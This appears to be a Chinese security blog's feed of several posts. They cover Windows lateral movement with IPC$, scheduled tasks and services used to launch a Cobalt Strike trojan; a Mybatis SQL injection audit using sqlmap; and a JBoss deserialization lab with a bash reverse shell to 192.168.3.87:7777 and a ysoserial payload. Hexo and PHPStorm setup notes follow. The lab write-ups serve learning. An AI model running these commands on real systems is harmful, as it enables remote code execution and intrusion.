class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span>\c$\result.txt</span><br></pre></td></tr></table></figure><p>利用at计划任务命令上线cs或者msf（<strong>IPC搭配at命令计划任务实现横向，即该章节内容</strong>）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line"><span class="built_in">at</span> \\&lt;靶机ip&gt; &lt;启动时间&gt; &lt;木马在靶机的位置&gt; //使用<span class="built_in">at</span>命令创建计划任务</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">1</span> /delete //删除计划任务(这里的<span class="number">1</span>为创建计划任务时候的ID)</span><br></pre></td></tr></table></figure><h4 id="003-schtasks命令实现计划任务"><a href="#003-schtasks命令实现计划任务" class="headerlink" title="003 schtasks命令实现计划任务"></a>003 schtasks命令实现计划任务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line">schtasks /create /TN cs /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span> //创建名为cs的计划任务</span><br><span class="line">schtasks /query /TN cs //查看创建的计划任务</span><br><span class="line">schtasks /delete /tn "cs" //删除计划任务</span><br></pre></td></tr></table></figure><h3 id="01-IPC-Windows服务"><a href="#01-IPC-Windows服务" class="headerlink" title="01 IPC$+Windows服务"></a>01 IPC$+Windows服务</h3><h4 id="001-SC命令"><a href="#001-SC命令" class="headerlink" title="001 SC命令"></a>001 SC命令</h4><blockquote><p> sc命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。 </p></blockquote><p>与靶机建立ipc连接，拷贝exe到主机系统上。在靶机上创建一个shell的服务并启动，最后删除：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-M836NN6NU8B create shell binpath= "c:\artifact.exe" //创建一个shell的服务</span><br><span class="line">sc \\WIN-M836NN6NU8B <span class="built_in">start</span> shell //启动shell服务</span><br><span class="line">sc \\[host] delete [servicename] //删除shell服务</span><br></pre></td></tr></table></figure><h2 id="0x01-Psexec工具"><a href="#0x01-Psexec工具" class="headerlink" title="0x01 Psexec工具"></a>0x01 Psexec工具</h2><blockquote><p> psexec是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。 </p></blockquote><p>使用Psexec的<strong>大体思路</strong>如下：</p><ul><li>通过<code>ipc$</code>连接<code>admin$</code>，释放二进制文件<code>psexecsvc.exe</code>到目标 。</li><li>通过服务管理<code>SCManager</code>远程创建一个<code>psexec</code>服务，并启动服务 。</li><li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据 。</li><li>运行结束后删除服务 。</li></ul><p>使用Psexec的<strong>利用条件</strong>如下：</p><ul><li>对方主机开启了 <code>admin$</code>共享，如果关闭了<code>admin$</code>共享，会提示：找不到网络名 </li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。 </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;p&gt;记录总结。抄自：&lt;a href=&quot;https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKML
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计之Mybatis框架SQL注入</title>
    <link href="http://bai-ren-1.github.io/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://bai-ren-1.github.io/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-06-20T08:58:39.000Z</published>
    <updated>2021-06-20T11:26:50.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计之Mybatis框架SQL注入"><a href="#Java审计之Mybatis框架SQL注入" class="headerlink" title="Java审计之Mybatis框架SQL注入"></a>Java审计之Mybatis框架SQL注入</h1><p>Java简单开源软件的审计。Mybatis框架在某些情况下处理不当就会造成SQL，参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q</a></p><h2 id="0x00-版本信息"><a href="#0x00-版本信息" class="headerlink" title="0x00 版本信息"></a>0x00 版本信息</h2><ul><li>Java版本 v 1.8.0_211</li><li>IntelliJ IDEA v 2019.3.1 </li><li>Tomcat v 9.0.33</li><li>因酷教育 v 2.0</li></ul><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="00-MySQL配置"><a href="#00-MySQL配置" class="headerlink" title="00 MySQL配置"></a>00 MySQL配置</h3><p>虽然是Java语言，但是为了方便，仍然使用WAMP环境来提供MySQL功能。开启Wampserver，使用SQLyog连接。在左侧的数据库连接处点击右键，选择“执行SQL脚本”，随后选择源码中提供的.sql文件导入并执行：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/1.png" alt></p><p>使用源码中的.sql执行时会出现一些执行错误，这里也暂时不管。等执行一半语句后，选择我们要使用的数据库，在查询界面重新导入.sql中的SQL语句执行，就能导入数据了：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/10.png" alt></p><h3 id="01-IDEA配置"><a href="#01-IDEA配置" class="headerlink" title="01 IDEA配置"></a>01 IDEA配置</h3><p>直接使用IDEA导入项目，配置JDK和Maven这些就不赘述，直接等IDEA把pom.xml拉完。然后根据软件说明文档，还需要安装lombok插件，选择“File - setting - plugin“搜索lombok并安装即可：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/3.png" alt></p><h3 id="02-属性配置"><a href="#02-属性配置" class="headerlink" title="02 属性配置"></a>02 属性配置</h3><p>选择”\src\main\resources\project.properties“，修改配置和修改”sql主机地址，数据库名，用户名，密码， 项目访问路径“这几个属性，即可正常访问项目：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/4.png" alt></p><h3 id="03-Maven编译"><a href="#03-Maven编译" class="headerlink" title="03 Maven编译"></a>03 Maven编译</h3><p>选择右侧菜单栏的Maven，依次选择”clean“和”install“执行：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/5.png" alt></p><h3 id="04-部署项目"><a href="#04-部署项目" class="headerlink" title="04 部署项目"></a>04 部署项目</h3><p>选择”Run - Edit Configurations - Maven“，在工作目录选择当前项目，然后命令行选择”tomcat7:run“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/6.png" alt></p><p>选择Run运行项目，访问82端口即可访问项目。因为刚刚数据库的原因会出现错误如下：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/7.png" alt></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>是个后台漏洞，首先进入后台。因为使用的是原生的测试数据，直接登录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试账号：admin 111111</span><br></pre></td></tr></table></figure><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/8.png" alt></p><p>跟踪到漏洞地址： <a href="http://x.x.x.x:82/admin/article/delete" target="_blank" rel="noopener">http://x.x.x.x:82/admin/article/delete</a></p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/9.png" alt></p><p>点击删除文章按钮，使用Burp抓包。这里我的Burp是抓不了本地地址，于是我把项目的地址重新配成非本地地址然后重新启动并能成功抓到包：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/11.png" alt></p><p>将抓取到的数据包保存为文本，直接丢进SQLMap跑看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r E:\inxedu.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/12.png" alt></p><p>成功注出数据库名！</p><h2 id="0x03-漏洞跟踪"><a href="#0x03-漏洞跟踪" class="headerlink" title="0x03 漏洞跟踪"></a>0x03 漏洞跟踪</h2><p>首先审计一个CMS，肯定是得先熟悉它的项目结构：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/13.png" alt></p><h3 id="00-Mybatis分辨"><a href="#00-Mybatis分辨" class="headerlink" title="00 Mybatis分辨"></a>00 Mybatis分辨</h3><p>点开Java项目的dao层下的任意文件，看看Mybatis是使用了<strong>注解开发还是配置文件开发</strong>。我们随便点开dao层的文章dao， 没发现有Mybatis的注解，那就肯定是使用了配置XML的方式 ：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/14.png" alt></p><h3 id="01-搜索映射文件"><a href="#01-搜索映射文件" class="headerlink" title="01 搜索映射文件"></a>01 搜索映射文件</h3><p>在<strong>resources文件夹</strong>中找到与其对应的<strong>映射配置文件</strong>：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/15.png" alt></p><p>根据博客最开头的Mybatis框架产生注入的原因，直接搜索<strong>使用了$且没进行过滤</strong>的内容：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/16.png" alt></p><h3 id="02-定位Dao接口"><a href="#02-定位Dao接口" class="headerlink" title="02 定位Dao接口"></a>02 定位Dao接口</h3><p>根据ID”deleteArticleByIds“<strong>找到对应的dao接口</strong>”ArticleDao“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/17.png" alt></p><h3 id="03-跟进Service实现"><a href="#03-跟进Service实现" class="headerlink" title="03 跟进Service实现"></a>03 跟进Service实现</h3><p>通过<strong>点击”ctrl+左键“</strong>选择Dao中函数名跟进到 <strong>对应的service层的实现</strong>deleteArticleByIds。往上看，可以看到Service实现方法并<strong>未对传入Dao层处理的变量articleIds进行过有效过滤，这也导致Dao中的ids变量未过滤</strong>：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/18.png" alt></p><blockquote><p>审计主要关注Service层代码，过滤处理的会从service层去实现， 而此处并没有发现过滤的代码 。</p></blockquote><h3 id="04-定位Controller"><a href="#04-定位Controller" class="headerlink" title="04 定位Controller"></a>04 定位Controller</h3><p>接下来就可以去找<strong>该service对应的Controller</strong>，这个可以使用idea的<strong>ctrl+Alt+H快捷键去查询调用层次找到Controller的位置</strong>。</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/22.png" alt></p><p>通过查看调用结构，我们可以<strong>定位到控制器</strong>”AdminArticleController.java“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/19.png" alt></p><p>通过调用结构我们可以看出：如果在控制器的路由下如果加上<strong>/delete路由</strong>，就会触发<strong>该控制器类中写的deleteArticle方法</strong>。而该控制器类中的deleteArticle方法实现如下，实际上调用的就是<strong>Service层中的deleteArticleByIds</strong>，而我们已经分析过是存在SQL注入的：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/21.png" alt></p><p>看回/delete路由下的方法，其中<strong>deleteArticle方法中的变量</strong>aridArr是通过<strong>request请求中的articelId变量</strong>直接获取的，<strong>即是由我们可控</strong>的。所以，符合存在SQL注入且变量是我们所可控且没过滤，故存在漏洞。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个框架还是有很多类似场景的SQL注入，这里就不一一赘述了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计之Mybatis框架SQL注入&quot;&gt;&lt;a href=&quot;#Java审计之Mybatis框架SQL注入&quot; class=&quot;headerlink&quot; title=&quot;Java审计之Mybatis框架SQL注入&quot;&gt;&lt;/a&gt;Java审计之Mybatis框架SQL注入&lt;/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Jboss反序列化</title>
    <link href="http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-06-14T10:32:14.000Z</published>
    <updated>2021-06-14T12:14:08.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jboss反序列化"><a href="#Jboss反序列化" class="headerlink" title="Jboss反序列化"></a>Jboss反序列化</h1><p>记录记录。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>直接使用Vulhub环境搭建即可，方便快捷。<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h2 id="0x01-CVE-2017-12149"><a href="#0x01-CVE-2017-12149" class="headerlink" title="0x01 CVE-2017-12149"></a>0x01 CVE-2017-12149</h2><h3 id="00-启动环境"><a href="#00-启动环境" class="headerlink" title="00 启动环境"></a>00 启动环境</h3><p>进入到目录中，使用docker开启环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>访问靶机的8080端口能看到一下界面说明开启成功。</p><h3 id="01-Payload准备"><a href="#01-Payload准备" class="headerlink" title="01 Payload准备"></a>01 Payload准备</h3><p>我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中执行的符号与bash命令可能有差别：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>因此可以通过使用编码进行转换处理，实现网站：<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.87/7777 0&gt;&amp;1</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>然后通过ysoserial工具，生成最终的反序列化攻击Payload。因为Vulhub环境较新，使用CommonsCollections6的Gadget来生成我们的最终Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure><p>在相同目录下生成的1.ser就是我们得到的反序列化攻击的Payload</p><h3 id="02-反序列化攻击"><a href="#02-反序列化攻击" class="headerlink" title="02 反序列化攻击"></a>02 反序列化攻击</h3><p>CVE-2017-12149是出现在/invoker/readonly请求中，服务器会将用户提交的POST内容进行Java反序列化，从而造成攻击。使用BP抓取/invoker/readonly的请求，在POST主体处右键点击”Paste from file“选择1.ser，然后把HTTP请求方式修改未POST：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><p>在攻击机准备好监听端口，使用nc监听本机的7777端口：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>然后BP发包，靶机的Jboss就会对POST内容进行反序列化，从而执行反弹shell的命令。我们在攻击机上就能收到反弹的shell：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>至此CVE-2017-12149复现成功，记得关闭docker环境：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>以后再补充其他Jboss的漏洞复现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Jboss反序列化&quot;&gt;&lt;a href=&quot;#Jboss反序列化&quot; class=&quot;headerlink&quot; title=&quot;Jboss反序列化&quot;&gt;&lt;/a&gt;Jboss反序列化&lt;/h1&gt;&lt;p&gt;记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>1DAY挖掘经验之通达OAPatch分析</title>
    <link href="http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/</id>
    <published>2021-06-10T08:18:12.000Z</published>
    <updated>2021-06-14T10:31:44.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1DAY挖掘经验之通达OAPatch分析"><a href="#1DAY挖掘经验之通达OAPatch分析" class="headerlink" title="1DAY挖掘经验之通达OAPatch分析"></a>1DAY挖掘经验之通达OAPatch分析</h1><p>看到写的这篇文章真的好，特来复现学习一番。<a href="https://www.anquanke.com/post/id/210395#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210395#h2-3</a></p><h2 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h2><p>假设看到通达OA的官网的补丁更新。<a href="https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。" target="_blank" rel="noopener">https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。</a></p><blockquote><p>日期: 2020.03.13<br>任意文件上传 影响版本: &lt;=v11<br>任意文件包含,影响版本: =v11</p></blockquote><ul><li>DiffMerge - 对比代码</li><li>SeayDzend - 解密通达OA的加密代码</li><li>通达OA v11.3 - 未Patch漏洞版本</li><li>通达OA补丁  2020_A1.11.3 - Patch</li></ul><h2 id="0x01-解密和对比"><a href="#0x01-解密和对比" class="headerlink" title="0x01 解密和对比"></a>0x01 解密和对比</h2><p>直接安装通达OA v11.3，然后将安装目录中的webroot文件夹copy到外面作为未patch的版本。随后安装通达OA补丁，再将安装过补丁后的webroot文件夹copy到外面作为patch过的版本。随便点开一个文件可见是Zend加密过的PHP代码，我们需要对其进行解密：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/1.png" alt></p><p>使用SeayDzend解密加密过的代码，文件比较多等待时间会比较长：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/2.png" alt></p><p>使用DiffMerge对比打了Patch前后产生变化的代码文件，然后不断跟进看是否是漏洞相关的代码：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/3.png" alt></p><blockquote><p>DiffMerge打开文件时候会因为中文而有编码问题。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;a href=&quot;#1DAY挖掘经验之通达OAPatch分析&quot; class=&quot;headerlink&quot; title=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;/a&gt;1DAY挖掘经验之通达OAPatch分析&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo报错</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/</id>
    <published>2021-06-08T05:56:52.000Z</published>
    <updated>2021-06-08T06:02:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo报错"><a href="#Hexo报错" class="headerlink" title="Hexo报错"></a>Hexo报错</h1><h2 id="0x00-Unknown-SSL-protocol-error"><a href="#0x00-Unknown-SSL-protocol-error" class="headerlink" title="0x00 Unknown SSL protocol error"></a>0x00 Unknown SSL protocol error</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;:        Unknown SSL protocol error in connection to github.com:443</span><br></pre></td></tr></table></figure><p>参考网上文章然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy </span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h2 id="0x01-Failed-to-connect"><a href="#0x01-Failed-to-connect" class="headerlink" title="0x01 Failed to connect"></a>0x01 Failed to connect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;: Failed to connect to github.com port 443: Timed out</span><br></pre></td></tr></table></figure><p>看起来就是连接问题，直接加个代理。找到用户目录下的.gitconfig文件，添加代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">proxy = 127.0.0.1:1080/</span><br></pre></td></tr></table></figure><p>重新push即可成功</p><h2 id="0x02-展望"><a href="#0x02-展望" class="headerlink" title="0x02 展望"></a>0x02 展望</h2><p>以后还有其他坑再补齐。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo报错&quot;&gt;&lt;a href=&quot;#Hexo报错&quot; class=&quot;headerlink&quot; title=&quot;Hexo报错&quot;&gt;&lt;/a&gt;Hexo报错&lt;/h1&gt;&lt;h2 id=&quot;0x00-Unknown-SSL-protocol-error&quot;&gt;&lt;a href=&quot;#0x00-U
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>PHPStorm结合Wampserver调试</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/</id>
    <published>2021-06-08T02:21:45.000Z</published>
    <updated>2021-06-08T05:45:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPStorm结合Wampserver调试"><a href="#PHPStorm结合Wampserver调试" class="headerlink" title="PHPStorm结合Wampserver调试"></a>PHPStorm结合Wampserver调试</h1><p>记录一下如何使用PHPStorm和Wampserver结合来调试代码，便于审计。</p><h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><ul><li>PHPStorm v.2018.3.5</li><li>Wampserver v.3.2.3</li><li>Xdebug helper v.1.6.1</li></ul><h2 id="0x01-配置过程"><a href="#0x01-配置过程" class="headerlink" title="0x01 配置过程"></a>0x01 配置过程</h2><h3 id="00-CMS搭建"><a href="#00-CMS搭建" class="headerlink" title="00 CMS搭建"></a>00 CMS搭建</h3><p>这部分没什么好说的，选择lfdycms作为我的cms选择。直接拉到www目录下面，添加虚拟地址方便访问：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/1.png" alt></p><p>上面画绿框的ServerName就是我添加的虚拟地址，这样访问<a href="http://www.lfdycms.com就能访问到本地搭建的环境。" target="_blank" rel="noopener">www.lfdycms.com就能访问到本地搭建的环境。</a></p><h3 id="01-Wampserver配置"><a href="#01-Wampserver配置" class="headerlink" title="01 Wampserver配置"></a>01 